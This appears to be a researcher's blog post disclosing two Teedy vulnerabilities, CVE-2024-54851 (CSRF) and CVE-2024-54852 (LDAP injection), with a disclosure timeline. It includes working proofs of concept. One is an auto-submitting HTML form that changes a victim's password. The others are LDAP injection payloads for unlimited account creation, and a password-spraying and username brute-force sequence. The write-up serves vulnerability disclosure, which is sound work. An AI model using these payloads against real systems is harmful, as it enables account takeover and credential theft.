---
date: '2025-01-28T16:27:06+02:00'
draft: false
title: "CVE in Teedy"
summary: "I discovered two vulnerabilites affecting Teedy: multiple CSRF (CVE-2024-54851) and a LDAP injection (CVE-2024-54852)."
tags: ["CVE", "Web"]
---
## 📝 TL;DR
Teedy is an open-source document management system written in Java. In october 2024, I discovered two vulnerabilities affecting Teedy: a lack of protection against CSRF attacks and a LDAP injection.

## 👾 CVE-2024-54851

### Summary

| ID                    | CVE-2024-54851                                           |
|-----------------------|----------------------------------------------------------|
| **Type**              | CSRF                                                     |
| **Title**             | Multiple CSRF                                            |
| **Product impacted**  | Teedy                                                    |
| **Impacted version**  | <= 1.12                                                  |
| **CVSS Score**        | 6.5                                                      |
| **Author**            | Sopalinge                                                |

### Description

Due to the lack of Cross-Site Request Forgery (CSRF) protections, most requests of the Teedy API in versions 1.12 and prior are vulnerable to such attack. This allows unauthenticated remote attackers to trick users into unknowingly performing arbitrary actions, such as editing profile information or tampering with the application data.

The only requests that are not vulnerable are the ones that ask for the account password, as it can't be guessed by the attacker.

The session cookie `SameSite` attribute is not defined, therefore the exploitation of POST CSRF will depend on the browser of the victim.

### Impact

The Teedy API documentation did not reveal any sensitive GET requests. However, multiple POST/PUT/DELETE... requests are sensitive and vulnerable to CSRF. The following requests are vulnerable (non-exhaustive list) :
 - Password change for current user
 - Account information change for any user
 - Account deletion for current or any user
 - Disable TOTP authentication for any user
 - Create a new user
 - Add any user to any group
 - Remove any user to any group
 - Delete group
 - ...


### Proof of concept

This PoC will trick the user into changing its current password for the one defined in the `value` attributes below. The attacker has to host the following page onto its server and trick a user connected to Teedy to visit this website.
```HTML
<html>
  <body>
    <form action="http://172.21.114.187:8080/api/user" method="POST">
      <input type="hidden" name="password" value="hackedpwd" />
      <input type="hidden" name="passwordconfirm" value="hackedpwd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

> [!note]
> In Chromium-based browser, the user needs to have connected 2 min prior to visiting the attacker page, due to the default behaviour of the SameSite attribute when not defined. [^1]

[^1]: [Chromium SameSite FAQ](https://www.chromium.org/updates/same-site/faq/)

## 👾 CVE-2024-54852

### Summary

| ID                    | CVE-2024-54852                                           |
|-----------------------|----------------------------------------------------------|
| **Type**              | LDAP Injection                                           |
| **Title**             | LDAP Injection on login form                             |
| **Product impacted**  | Teedy                                                    |
| **Impacted version**  | Versions between 1.9 and 1.12 included                   |
| **CVSS Score**        | 8.2                                                      |
| **Author**            | Sopalinge                                                |

### Description

When LDAP connection is activated on Teedy in versions 1.12 or prior, the username field of the login form is vulnerable to LDAP injection. Due to improper sanitization of user input, an unauthenticated attacker is then able to perform various malicious actions, such as creating arbitrary accounts and spraying passwords.

LDAP connection is **not** enabled by default. An administrator has to activate and configure it beforehand by defining an LDAP query that the application will run to authenticate users. It has to contain a `USERNAME` placeholder, e.g. `(&(objectclass=inetOrgPerson)(uid=USERNAME))`.

The root cause of the vulnerability lies in the `authenticate` method of the `docs-core/src/main/java/com/sismics/docs/core/util/authentication/LdapAuthenticationHandler.java` file of Teedy :
```Java
public User authenticate(String username, String password) {
    ...
    ConfigUtil.getConfigStringValue(ConfigType.LDAP_FILTER).replace("USERNAME", username), SearchScope.SUBTREE);
    ...
}
```
The `USERNAME` placeholder is directly replaced in the query by the user input `username` variable. The LDAP query is then executed, which allows an attacker to modify its execution flow and perform various malicious actions.

### Impact

The impact can vary depending on the LDAP query defined for the LDAP connection to Teedy. However, various malicious actions can be performed, such as :
 - Unrestricted account creation
 - Password spraying
 - ...

Next section goes into details of these two examples.

### Proof of concept

For this part, it is assumed the two following :
 - The LDAP query is : `(&(objectclass=inetOrgPerson)(uid=USERNAME))`
 - The attacker knows one LDAP account `jdoe:password`

#### Unrestricted account creation
An attacker can inject the payload `jdoe))((|(uid=1` into the username field of the login form and input the right password for the `jdoe` account. The LDAP query then becomes `(&(objectclass=inetOrgPerson)(uid=jdoe))((|(uid=1))` which yields true as the password is correct.\
Because the account `jdoe))((|(uid=1` does not exist in the Teedy database, it is created.

Therefore, an attacker can create as many accounts as he wants as long as he knows at least one valid LDAP account, by inputting crafted usernames like :
```
jdoe))((|(uid=1
jdoe))((|(uid=2
jdoe))((|(uid=3
...
```

As a side effect, because the Teedy API does not support special characters in usernames, most profile methods for these accounts will break. That means that an administrator will not be able to delete these accounts through the web interface, whereas most functionnalities will remain functional for the attacker.

#### Password spraying
An attacker can perform password spraying onto the LDAP. It is indeed possible to inject the following payload into the username field of the login form `*)(userPassword=hello123` and the same password guess in the password field. The LDAP query then becomes `(&(objectclass=inetOrgPerson)(uid=*)(userPassword=hello123))` which will return true if an LDAP account with the password `hello123` exists. In that case, the login is validated and the attacker will be connected to Teedy with the newly created `*)(userPassword=hello123` user. Otherwise, the login form will yield an error.

It is therefore possible to spray a list of common passwords with only one LDAP request by password. Once a valid password is found, it is possible to find the user(s) that have it by finding the username character by character and inputting the newly found password into the password field of the Teedy login form. The bruteforce requests would look like the following :
```
# If you have found 'hello123' as a valid password, use it in the password field of the login form
username: a*)(userPassword=hello123     # Error
username: b*)(userPassword=hello123     # Error
username: c*)(userPassword=hello123     # OK => username starts with 'c'
...

username: ca*)(userPassword=hello123    # OK => username starts with 'ca'
username: cb*)(userPassword=hello123    # Error
username: cc*)(userPassword=hello123    # Error
...

username: caa*)(userPassword=hello123   # Error
username: cab*)(userPassword=hello123   # OK => username starts with 'cab'
username: cac*)(userPassword=hello123   # Error
...

# And so on, until you find the whole username
```

## 📆 Timeline

- 23/10/2024 : Vulnerability discovered
- 24/10/2024 : Vendor contacted
- 12/12/2024 : CVE ID attributed
- 28/01/2025 : CVE publicly disclosed


## 📖 References

- [Teedy source code](https://github.com/sismics/docs)